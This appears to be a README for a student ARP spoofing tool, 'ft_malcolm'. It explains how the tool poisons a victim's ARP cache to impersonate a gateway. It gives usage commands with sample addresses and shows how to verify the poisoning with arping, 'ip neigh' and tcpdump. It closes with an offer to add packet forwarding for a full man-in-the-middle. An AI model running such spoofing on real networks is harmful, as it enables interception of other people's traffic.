# ft\_malcolm

## Overview

`ft_malcolm` is a simple ARP spoofing tool that allows an attacker to impersonate a gateway and manipulate the ARP table of a victim machine. This enables a Man-in-the-Middle (MITM) attack, where the attacker intercepts the victim’s network traffic.

## How It Works

`ft_malcolm` listens for ARP requests from the victim machine and replies with a fake ARP response, claiming that the attacker's MAC address belongs to the gateway’s IP. Once the victim updates its ARP cache, it starts sending network traffic intended for the gateway to the attacker instead.

## Attack Scenario

- **Attacker**: Runs `ft_malcolm` to spoof the gateway's MAC address.
- **Victim**: Sends an ARP request asking for the gateway’s MAC.
- **Attacker**: Sends a spoofed ARP reply, claiming to be the gateway.
- **Victim**: Updates its ARP table and sends traffic to the attacker instead of the real gateway.

## Installation

To compile `ft_malcolm`, run:

```sh
make
```

This generates the `ft_malcolm` executable.

## Usage

```sh
sudo ./ft_malcolm <gateway_ip> <attacker_mac> <victim_ip> <victim_mac>
```

### Example:

```sh
sudo ./ft_malcolm 172.168.238.1 02:42:ac:a8:ee:04 172.168.238.3 02:42:ac:a8:ee:03
```

This command:

- Spoofs the **gateway** (`172.168.238.1`) by responding with the **attacker's MAC** (`02:42:ac:a8:ee:04`).
- Targets the **victim** (`172.168.238.3`) with its **real MAC** (`02:42:ac:a8:ee:03`).

## Testing ft\_malcolm

To verify that the attack is working, follow these steps:

### 1️⃣ Run `ft_malcolm` on the Attacker:

```sh
sudo ./ft_malcolm 172.168.238.1 02:42:ac:a8:ee:04 172.168.238.3 02:42:ac:a8:ee:03
```

### 2️⃣ Send ARP Requests from the Victim:

On the **victim machine** (`172.168.238.3`), run:

```sh
arping -c 5 -I eth0 172.168.238.1
```

This sends ARP requests asking *"Who has 172.168.238.1?"*.

### 3️⃣ Verify the Attack:

After running `arping`, check the victim’s ARP table:

```sh
ip neigh show
```

Expected output (if successful):

```
172.168.238.1 dev eth0 lladdr 02:42:ac:a8:ee:04 REACHABLE
```

✅ The gateway’s MAC address has been replaced with the attacker’s MAC.

### 4️⃣ Capture Packets with tcpdump (Optional):

To confirm that the attacker is sending ARP replies, run on the **victim**:

```sh
sudo tcpdump -n -i eth0 arp
```

You should see something like:

```
21:15:32.123456 ARP, Reply 172.168.238.1 is-at 02:42:ac:a8:ee:04
```

✅ The attacker is successfully sending fake ARP replies.

## Conclusion

- `ft_malcolm` successfully poisons the victim’s ARP table, tricking it into sending traffic to the attacker.
- The attack can be verified using `ip neigh show` and `tcpdump`.
- This method enables MITM attacks, where the attacker can intercept and manipulate traffic.

⚠ **Disclaimer**: This tool is for educational and research purposes only. Unauthorized use is illegal.

---

### 🔥 Next Steps

Would you like to implement packet forwarding to act as a real MITM and capture traffic? 🚀

